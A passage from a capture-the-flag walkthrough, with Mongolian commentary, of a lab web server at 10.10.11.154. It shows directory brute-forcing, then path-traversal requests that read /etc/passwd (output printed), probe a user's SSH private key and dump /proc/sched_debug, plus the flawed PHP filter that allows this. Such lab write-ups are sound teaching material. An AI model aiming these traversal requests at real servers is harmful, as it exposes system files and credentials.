</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   196/s   http://10.10.11.154/assets/img</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   196/s   http://10.10.11.154/assets/img/about</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   195/s   http://10.10.11.154/assets/img/logos</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>####################] - 2m     29999/29999   196/s   http://10.10.11.154/assets/img/team</span>
</span></span></code></pre></div><h3 id=5-lfi>5. LFI<a hidden class=anchor aria-hidden=true href=#5-lfi>#</a></h3><p><strong>Burp</strong>-—Å;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /index.php?page<span style=color:#f92672>=</span>../../../../../../../../../../etc/passwd HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.11.154
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p><strong>Result</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>302</span> Found
</span></span><span style=display:flex><span>Server: nginx
</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>11</span> Apr <span style=color:#ae81ff>2022</span> 09:09:56 GMT
</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Location: /index.php?page<span style=color:#f92672>=</span>default.html
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>1488</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
</span></span><span style=display:flex><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>vagrant:x:1000:1000::/vagrant:/bin/bash
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>dev:x:1001:1001::/home/dev:/bin/bash
</span></span></code></pre></div><p>passwd-—Å <code>dev</code> —Ö—ç—Ä—ç–≥–ª—ç–≥—á <code>/home/dev</code> dir-–≥ —Ö–∞—Ä–∂ –±–æ–ª–∂ –±–∞–π–Ω–∞.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /index.php?page<span style=color:#f92672>=</span>../../../../../../../../../../home/dev/.ssh/id_rsa HTTP/1.1
</span></span><span style=display:flex><span>GET /index.php?page<span style=color:#f92672>=</span>../../../../../../../../../../home/dev/user.txt HTTP/1.1
</span></span></code></pre></div><p>–¥—ç—ç—Ä –±–∞–π–≥–∞–∞–≥ “Ø–∑—ç—Ö—ç—ç—Ä –±–æ–ª–æ–æ–≥“Ø–π.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/prod/sched_debug
</span></span><span style=display:flex><span>index.php?page<span style=color:#f92672>=</span>../../../../../../../../../../prod/sched_debug
</span></span></code></pre></div><p>index.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>sanitize_input</span>($param) {  
</span></span><span style=display:flex><span> $param1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;../&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>,$param);  
</span></span><span style=display:flex><span> $param2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;./&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>,$param1);  
</span></span><span style=display:flex><span> <span style=color:#66d9ef>return</span> $param2;  
</span></span><span style=display:flex><span>}  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>$page <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;page&#39;</span>];  
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($page) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/^[a-z]/&#34;</span>, $page)) {  
</span></span><span style=display:flex><span> $page <span style=color:#f92672>=</span> <span style=color:#a6e22e>sanitize_input</span>($page);  
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {  
</span></span><span style=display:flex><span> <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /index.php?page=default.html&#39;</span>);  
</span></span><span style=display:flex><span>}  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span><span style=color:#a6e22e>readfile</span>($page);  
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>http://10.10.11.154/index.php?page=beta.html
beta.html</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;activate_license.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>enctype</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;multipart/form-data&#34;</span>&gt;  
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>label</span> <span style=color:#a6e22e>for</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;formFile&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-label&#34;</span>&gt;Upload License Key File&lt;/<span style=color:#f92672>label</span>&gt;  
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control form-control-lg&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;formFile&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;licensefile&#34;</span>/&gt;  
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-primary&#34;</span>&gt;Submit&lt;/<span style=color:#f92672>button</span>&gt;  
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>form</span>&gt;
</span></span></code></pre></div><p>http://10.10.11.154/index.php?page=activate_license.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /index.php?page<span style=color:#f92672>=</span>activate_license.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.11.154
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>Currently development for EMUEMU just started, but we have big plans. If you bought an OSTRICH console from us and want want to be part of the next step, you can enable your OSTRICH license for usage with EMUEMU via the activate_license application today for our upcoming beta testing program for EMUEMU.
A license files contains a 512 bit key. That key is also in the QR code contained within the OSTRICH package. Thank you for participating in our beta testing program.
Upload License Key File</p><p>activate_license.php</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>  
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>])) {  
</span></span><span style=display:flex><span> $license¬† ¬† ¬† <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]);  
</span></span><span style=display:flex><span> $license_size <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>][<span style=color:#e6db74>&#39;size&#39;</span>];  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span> $socket <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket_create</span>(<span style=color:#a6e22e>AF_INET</span>, <span style=color:#a6e22e>SOCK_STREAM</span>, <span style=color:#a6e22e>SOL_TCP</span>);  
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$socket) { <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;error socket_create()</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>; }  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>socket_connect</span>($socket, <span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>1337</span>)) {  
</span></span><span style=display:flex><span> <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;error socket_connect()&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>socket_strerror</span>(<span style=color:#a6e22e>socket_last_error</span>()) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;  
</span></span><span style=display:flex><span> }  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span> <span style=color:#a6e22e>socket_write</span>($socket, <span style=color:#a6e22e>pack</span>(<span style=color:#e6db74>&#34;N&#34;</span>, $license_size));  
</span></span><span style=display:flex><span> <span style=color:#a6e22e>socket_write</span>($socket, $license);  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span> <span style=color:#a6e22e>socket_shutdown</span>($socket);  
</span></span><span style=display:flex><span> <span style=color:#a6e22e>socket_close</span>($socket);  
</span></span><span style=display:flex><span>}  
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /index.php?page<span style=color:#f92672>=</span>../../../../../../../../../../proc/sched_debug HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.11.154
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>proc/sched_debug</p><pre tabindex=0><code class=language-binary data-lang=binary>HTTP/1.1 302 Found
Server: nginx
Date: Wed, 13 Apr 2022 03:51:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /index.php?page=default.html
Content-Length: 26169

Sched Debug Version: v0.11, 5.10.0-11-amd64 #1
ktime                                   : 84680521.804596
sched_clk                               : 84680203.312486
cpu_clk                                 : 84680188.015484
jiffies                                 : 4316062397
sched_clock_stable()                    : 1

sysctl_sched
  .sysctl_sched_latency                    : 12.000000
  .sysctl_sched_min_granularity            : 1.500000
  .sysctl_sched_wakeup_granularity         : 2.000000
  .sysctl_sched_child_runs_first           : 0
  .sysctl_sched_features                   : 16722747
  .sysctl_sched_tunable_scaling            : 1 (logarithmic)

cpu#0, 2994.375 MHz
  .nr_running                    : 1
  .nr_switches                   : 5155430
  .nr_uninterruptible            : 97
  .next_balance                  : 4316.062369
  .curr-&gt;pid                     : 13721
  .clock                         : 84680187.755306
  .clock_task                    : 84680187.755306
  .avg_idle                      : 882136
  .max_idle_balance_cost         : 500000

cfs_rq[0]:/
  .exec_clock                    : 0.000000
  .MIN_vruntime                  : 0.000001
  .min_vruntime                  : 470279.159394
  .max_vruntime                  : 0.000001
  .spread                        : 0.000000
  .spread0                       : 0.000000
  .nr_spread_over                : 0
  .nr_running                    : 1
  .load                          : 1048576
  .load_avg                      : 9
  .runnable_avg                  : 9
  .util_avg                      : 9
  .util_est_enqueued             : 8
  .removed.load_avg              : 0
  .removed.util_avg              : 0
  .removed.runnable_avg          : 0
  .tg_load_avg_contrib           : 0
  .tg_load_avg                   : 0
  .throttled                     : 0
  .throttle_count                : 0

rt_rq[0]:
  .rt_nr_running                 : 0
  .rt_nr_migratory               : 0
  .rt_throttled                  : 0
  .rt_time                       : 0.000000
  .rt_runtime                    : 950.000000

dl_rq[0]:
  .dl_nr_running                 : 0
  .dl_nr_migratory               : 0
  .dl_bw-&gt;bw                     : 996147
  .dl_bw-&gt;total_bw               : 0

runnable tasks:
 S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-------------------------------------------------------------------------------------------------------------
 S         systemd     1    470273.931361     26356   120         0.000000     12154.194523         0.000000 0 0 /
 S        kthreadd     2    470118.249610       798   120         0.000000        43.232385         0.000000 0 0 /
 I          rcu_gp     3        13.977682         2   100         0.000000         0.004629         0.000000 0 0 /
 I      rcu_par_gp     4        15.978414         2   100         0.000000         0.002695         0.000000 0 0 /
 I    kworker/0:0H     6       728.727785         4   100         0.000000         0.023474         0.000000 0 0 /
 I    mm_percpu_wq     9        22.732288         2   100         0.000000         0.002565         0.000000 0 0 /
 S rcu_tasks_rude_    10        24.733774         2   120         0.000000         0.002515         0.000000 0 0 /
 S rcu_tasks_trace    11        26.734425         2   120         0.000000         0.002135         0.000000 0 0 /
 S     ksoftirqd/0    12    470273.303445    234438   120         0.000000      3866.137484         0.000000 0 0 /
 I       rcu_sched    13    470278.635149   1398813   120         0.000000     17658.025786         0.000000 0 0 /
 S     migration/0    14         0.000000     21279     0         0.000000       443.966905         0.000000 0 0 /
 S         cpuhp/0    15      2355.724616        10   120         0.000000         0.209440         0.000000 0 0 /
 I           netns    24        64.773608         2   100         0.000000         0.028563         0.000000 0 0 /
 S      khungtaskd    26    470147.700559       702   120         0.000000        79.915165         0.000000 0 0 /
 S      oom_reaper    27        74.895783         2   120         0.000000         0.000000         0.000000 0 0 /
 I       writeback    28        80.895780         2   100         0.000000         0.000000         0.000000 0 0 /
 S            ksmd    30        92.895774         2   125         0.000000         0.000000         0.000000 0 0 /
 I     kintegrityd    49       374.954142         2   100         0.000000         0.000000         0.000000 0 0 /
 I         kblockd    50       380.954139         2   100         0.000000         0.000000         0.000000 0 0 /
 I     edac-poller    52       666.594020         2   100         0.000000         0.000000         0.000000 0 0 /
 I    kworker/0:1H    54    470273.162678     44338   100         0.000000      1002.530760         0.000000 0 0 /
 S         kswapd0    56       969.541102         3   120         0.000000         0.044243         0.000000 0 0 /
 I        kthrotld    57       767.223323         2   100         0.000000         0.038923         0.000000 0 0 /
 S   irq/24-pciehp    58         0.000000         2    49         0.000000         0.047507         0.000000 0 0 /
 S   irq/26-pciehp    60         0.000000         2    49         0.000000         0.032440         0.000000 0 0 /
 S   irq/28-pciehp    62         0.000000         2    49         0.000000         0.028022         0.000000 0 0 /
 S   irq/30-pciehp    64         0.000000         2    49         0.000000         0.030929         0.000000 0 0 /
 S   irq/32-pciehp    66         0.000000         2    49         0.000000         0.102563         0.000000 0 0 /
 S   irq/34-pciehp    68         0.000000         2    49         0.000000         0.033433         0.000000 0 0 /
 S   irq/36-pciehp    70         0.000000         2    49         0.000000         0.048562         0.000000 0 0 /
 S   irq/38-pciehp    72         0.000000         2    49         0.000000         0.053139         0.000000 0 0 /
 S   irq/40-pciehp    74         0.000000         2    49         0.000000         0.032441         0.000000 0 0 /
 S   irq/42-pciehp    76         0.000000         2    49         0.000000         0.061664         0.000000 0 0 /
 S   irq/44-pciehp    78         0.000000         2    49         0.000000         0.059964         0.000000 0 0 /
 S   irq/46-pciehp    80         0.000000         2    49         0.000000         0.045345         0.000000 0 0 /
 S   irq/48-pciehp    82         0.000000         2    49         0.000000         0.072327         0.000000 0 0 /
 S   irq/50-pciehp    84         0.000000         2    49         0.000000         0.046387         0.000000 0 0 /
 S   irq/52-pciehp    86         0.000000         2    49         0.000000         0.095389         0.000000 0 0 /
 S   irq/54-pciehp    88         0.000000         2    49         0.000000         0.035466         0.000000 0 0 /
 I acpi_thermal_pm    90       900.787224         2   100         0.000000         0.031008         0.000000 0 0 /
 I   ipv6_addrconf    92       905.235396         2   100         0.000000         0.018906         0.000000 0 0 /
 I           kstrp   101       953.365437         2   100         0.000000         0.041096         0.000000 0 0 /
 I    zswap-shrink   104      1008.899177         2   100         0.000000         0.065664         0.000000 0 0 /
 I    kworker/u5:0   105      1012.917683         2   100         0.000000         0.022132         0.000000 0 0 /
 S       scsi_eh_0   151      1318.113572         6   120         0.000000        82.957574         0.000000 0 0 /
 S       scsi_eh_2   159      1559.312628        26   120         0.000000         0.523253         0.000000 0 0 /
 I      mpt_poll_0   160      1238.381341         2   100         0.000000         0.031669         0.000000 0 0 /
 I           mpt/0   161      1241.401738         2   100         0.000000         0.021510         0.000000 0 0 /
 I      scsi_tmf_2   162      1318.093461         2   100         0.000000         0.012252         0.000000 0 0 /
 I      scsi_tmf_3   164      1326.099880         2   100         0.000000         0.008556         0.000000 0 0 /
 I      scsi_tmf_4   166      1330.103473         2   100         0.000000         0.004669         0.000000 0 0 /
 I      scsi_tmf_5   168      1334.122953         2   100         0.000000         0.020759         0.000000 0 0 /
 I      scsi_tmf_6   170      1338.139234         2   100         0.000000         0.017383         0.000000 0 0 /
 S       scsi_eh_7   171      1559.297499        26   120         0.000000         0.312517         0.000000 0 0 /
 I      scsi_tmf_7   172      1342.155522         2   100         0.000000         0.017142         0.000000 0 0 /
 I      scsi_tmf_8   174      1346.169972         2   100         0.000000         0.015570         0.000000 0 0 /
 S       scsi_eh_9   175      1559.343885        26   120         0.000000         0.355466         0.000000 0 0 /
 I      scsi_tmf_9   176      1350.184659         2   100         0.000000         0.015699         0.000000 0 0 /
 S      scsi_eh_10   177      1559.415509        26   120         0.000000         0.414236         0.000000 0 0 /
 I     scsi_tmf_10   178      1354.200381         2   100         0.000000         0.016962         0.000000 0 0 /
 I     scsi_tmf_11   180      1358.214386         2   100         0.000000         0.014997         0.000000 0 0 /
 I     scsi_tmf_12   182      1362.229003         2   100         0.000000         0.015599         0.000000 0 0 /
 I     scsi_tmf_13   184      1366.243037         2   100         0.000000         0.014927         0.000000 0 0 /
 I     scsi_tmf_14   186      1370.257565         2   100         0.000000         0.015620         0.000000 0 0 /
 S      scsi_eh_15   187      1559.283563        26   120         0.000000         0.350127         0.000000 0 0 /
 I     scsi_tmf_15   188      1374.272092         2   100         0.000000         0.015519         0.000000 0 0 /
 S      scsi_eh_16   189      1559.244359        26   120         0.000000         0.308008         0.000000 0 0 /
 I     scsi_tmf_16   190      1378.286038         2   100         0.000000         0.014948         0.000000 0 0 /
 S      scsi_eh_17   191      1559.243517        26   120         0.000000         0.313205         0.000000 0 0 /
 I     scsi_tmf_17   192      1382.416404         2   100         0.000000         0.131477         0.000000 0 0 /
 S      scsi_eh_18   193      1559.257142        26   120         0.000000         0.333966         0.000000 0 0 /
 I     scsi_tmf_18   194      1386.432996         2   100         0.000000         0.017623         0.000000 0 0 /
 I     scsi_tmf_19   196      1390.448174         2   100         0.000000         0.016121         0.000000 0 0 /
 S      scsi_eh_20   197      1559.334488        26   120         0.000000         0.404589         0.000000 0 0 /
 I     scsi_tmf_20   198      1394.464114         2   100         0.000000         0.016892         0.000000 0 0 /
 I     scsi_tmf_21   200      1398.478440         2   100         0.000000         0.015298         0.000000 0 0 /
 I     scsi_tmf_22   202      1402.493539         2   100         0.000000         0.016130         0.000000 0 0 /
 S      scsi_eh_23   203      1559.348615        26   120         0.000000         0.312147         0.000000 0 0 /
 I     scsi_tmf_23   204      1406.505911         2   100         0.000000         0.013285         0.000000 0 0 /
 I     scsi_tmf_24   206      1410.517302         2   100         0.000000         0.012373         0.000000 0 0 /
 S      scsi_eh_25   207      1559.343972        26   120         0.000000         0.309217         0.000000 0 0 /
 I     scsi_tmf_25   208      1414.534994         2   100         0.000000         0.018595         0.000000 0 0 /
 S      scsi_eh_26   209      1559.163536        26   120         0.000000         0.262300         0.000000 0 0 /
 I     scsi_tmf_26   210      1418.549100         2   100         0.000000         0.014989         0.000000 0 0 /
 S      scsi_eh_27   211      1559.186772        26   120         0.000000         0.282339         0.000000 0 0 /
 I     scsi_tmf_27   212      1422.563427         2   100         0.000000         0.015249         0.000000 0 0 /
 I     scsi_tmf_28   214      1426.577082         2   100         0.000000         0.014637         0.000000 0 0 /
 S      scsi_eh_29   215      1559.162677        26   120         0.000000         0.259530         0.000000 0 0 /
 I     scsi_tmf_29   216      1430.590988         2   100         0.000000         0.014778         0.000000 0 0 /
 S      scsi_eh_30   217      1559.178394        26   120         0.000000         0.274322         0.000000 0 0 /
 I     scsi_tmf_30   218      1434.605655         2   100         0.000000         0.015600         0.000000 0 0 /
 S      scsi_eh_31   219      1559.163257        26   120         0.000000         0.259427         0.000000 0 0 /
 S      scsi_eh_32   249      1561.040280         2   120         0.000000         0.035516         0.000000 0 0 /
 I     scsi_tmf_32   250      1565.065283         2   100         0.000000         0.027331         0.000000 0 0 /
 I ext4-rsv-conver   282      1755.018274         3   100         0.000000         0.019756         0.000000 0 0 /
 S   systemd-udevd   348    470187.031091      1458   120         0.000000       283.819041         0.000000 0 0 /
 S           gmain   571     11352.409969       146   120         0.000000         1.806799         0.000000 0 0 /
 S activate_licens   418    446273.871782        30   120         0.000000         9.136912         0.000000 0 0 /
 S            cron   420    470273.288456      2919   120         0.000000       762.280155         0.000000 0 0 /
 S     dbus-daemon   421    470273.611542     18280   120         0.000000      4401.913468         0.000000 0 0 /
 S  systemd-logind   435    470273.458224     18341   120         0.000000      2257.399290         0.000000 0 0 /
 S          hwmon1   476      5018.456000         2   120         0.000000         0.022742         0.000000 0 0 /
 S      php-fpm7.4   534    470274.643375     93194   120         0.000000      5149.097210         0.000000 0 0 /
 S          agetty   537     10135.820186         8   120         0.000000         4.053591         0.000000 0 0 /
 S            sshd   542    457594.772813       369   120         0.000000       108.212769         0.000000 0 0 /
 S           nginx   544    470273.613225   1265337   120         0.000000    256203.405254         0.000000 0 0 /
 S         chronyd   546    464357.367909       129   120         0.000000        14.518773         0.000000 0 0 /
 S         chronyd   547    464357.346779       188   120         0.000000        28.587065         0.000000 0 0 /
 S      php-fpm7.4 13565    469573.518637     70318   120         0.000000     11646.371496         0.000000 0 0 /
 S      php-fpm7.4 13704    470163.882496     52668   120         0.000000     11328.008245         0.000000 0 0 /
&gt;R      php-fpm7.4 13721    470273.193438     52166   120         0.000000      9299.603609         0.000000 0 0 /
 I     kworker/0:1 32426    470274.666697     24804   120         0.000000       717.247851         0.000000 0 0 /
 I    kworker/u4:0 35199    470273.543113      1039   120         0.000000        55.980461         0.000000 0 0 /
 I    kworker/u4:2 35526    470124.294341       416   120         0.000000        23.683800         0.000000 0 0 /
 I     kworker/0:2 35926    469600.704800         9   120         0.000000         0.115347         0.000000 0 0 /
 I    kworker/u4:1 36028    470274.534095        87   120         0.000000         4.921252         0.000000 0 0 /

cpu#1, 2994.375 MHz
  .nr_running                    : 0
  .nr_switches                   : 11377902
  .nr_uninterruptible            : -97
  .next_balance                  : 4316.062370
  .curr-&gt;pid                     : 0
  .clock                         : 84680183.209272
  .clock_task                    : 84680183.209272
  .avg_idle                      : 1000000
  .max_idle_balance_cost         : 500000

cfs_rq[1]:/
  .exec_clock                    : 0.000000
  .MIN_vruntime                  : 0.000001
  .min_vruntime                  : 468595.964356
  .max_vruntime                  : 0.000001
  .spread                        : 0.000000
  .spread0                       : -1683.195038
  .nr_spread_over                : 0
  .nr_running                    : 0
  .load                          : 0
  .load_avg                      : 0
  .runnable_avg                  : 0
  .util_avg                      : 0
  .util_est_enqueued             : 0
  .removed.load_avg              : 0
  .removed.util_avg              : 0
  .removed.runnable_avg          : 0
  .tg_load_avg_contrib           : 0
  .tg_load_avg                   : 0
  .throttled                     : 0
  .throttle_count                : 0

rt_rq[1]:
  .rt_nr_running                 : 0
  .rt_nr_migratory               : 0
  .rt_throttled                  : 0
  .rt_time                       : 0.069640
  .rt_runtime                    : 950.000000

dl_rq[1]:
  .dl_nr_running                 : 0
  .dl_nr_migratory               : 0
  .dl_bw-&gt;bw                     : 996147
